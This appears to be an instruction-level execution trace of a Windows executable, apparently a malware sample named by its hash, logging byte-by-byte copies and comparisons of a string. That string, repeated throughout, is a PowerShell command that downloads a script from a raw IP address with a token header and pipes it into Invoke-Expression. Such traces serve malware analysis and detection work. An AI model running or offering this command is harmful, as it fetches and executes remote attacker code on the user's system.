+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270777] = 0x6c (108) -> "l"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8a9] = 0x6c (108) -> "l -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270778] = 0x6c (108) -> "l"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8aa] = 0x20 (32) -> " -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270779] = 0x20 (32) -> " "
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8ab] = 0x2d (45) -> "-Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27077a] = 0x2d (45) -> "-"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8ac] = 0x43 (67) -> "Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27077b] = 0x43 (67) -> "C"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8ad] = 0x6f (111) -> "ommand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27077c] = 0x6f (111) -> "o"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8ae] = 0x6d (109) -> "mmand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27077d] = 0x6d (109) -> "m"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8af] = 0x6d (109) -> "mand "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27077e] = 0x6d (109) -> "m"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b0] = 0x61 (97) -> "and "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27077f] = 0x61 (97) -> "a"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b1] = 0x6e (110) -> "nd "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270780] = 0x6e (110) -> "n"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b2] = 0x64 (100) -> "d "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270781] = 0x64 (100) -> "d"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b3] = 0x20 (32) -> " "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270782] = 0x20 (32) -> " "
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b4] = 0x22 (34) -> ""iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270783] = 0x22 (34) -> """
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b5] = 0x69 (105) -> "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270784] = 0x69 (105) -> "i"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b6] = 0x77 (119) -> "wr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270785] = 0x77 (119) -> "w"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b7] = 0x72 (114) -> "r -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270786] = 0x72 (114) -> "r"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b8] = 0x20 (32) -> " -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270787] = 0x20 (32) -> " "
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8b9] = 0x2d (45) -> "-useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270788] = 0x2d (45) -> "-"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8ba] = 0x75 (117) -> "useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e270789] = 0x75 (117) -> "u"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8bb] = 0x73 (115) -> "seb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27078a] = 0x73 (115) -> "s"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8bc] = 0x65 (101) -> "eb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27078b] = 0x65 (101) -> "e"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8bd] = 0x62 (98) -> "b 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27078c] = 0x62 (98) -> "b"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8be] = 0x20 (32) -> " 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27078d] = 0x20 (32) -> " "
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8bf] = 0x27 (39) -> "'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27078e] = 0x27 (39) -> "'"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac0 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005810 | mov al, byte ptr [r8+r9*1] | [Read 1Op]: 
+        [0x00007ff745e2a8c0] = 0x68 (104) -> "http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e16ac4 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x000000005814 | mov byte ptr [r9], al | [Write]: 
+        [0x000001fa6e27078f] = 0x68 (104) -> "h"
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdac a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bafc | mov rcx, qword ptr [r14] | [Read 1Op]: 
+        [0x0000009c9c3afb78] = 0x00007ff745e2a8a0 (140700006131872)
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a0] = 0x70 (112) -> "powershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a1] = 0x6f (111) -> "owershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a2] = 0x77 (119) -> "wershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a3] = 0x65 (101) -> "ershell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a4] = 0x72 (114) -> "rshell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a5] = 0x73 (115) -> "shell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a6] = 0x68 (104) -> "hell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a7] = 0x65 (101) -> "ell -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a8] = 0x6c (108) -> "ll -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8a9] = 0x6c (108) -> "l -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
+        [0x00007ff745e2a8aa] = 0x20 (32) -> " -Command "iwr -useb 'http://147.45.44.131/infopage/bhdh552.ps1' -Headers @{'X-Special-Header'='qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq'} | iex""
+-------------------------------------------------------------------------------------------------------------------------------------
+[T0] 0x00007ff745e1cdb5 a0aeb837cb5e762fc0b7d657c71d343e765cccb5780cd315756f682418b3cdfe.exe:unnamedImageEntryPoint+0x00000000bb05 | cmp byte ptr [rcx+rax*1], dl | [Read 1Op]: 
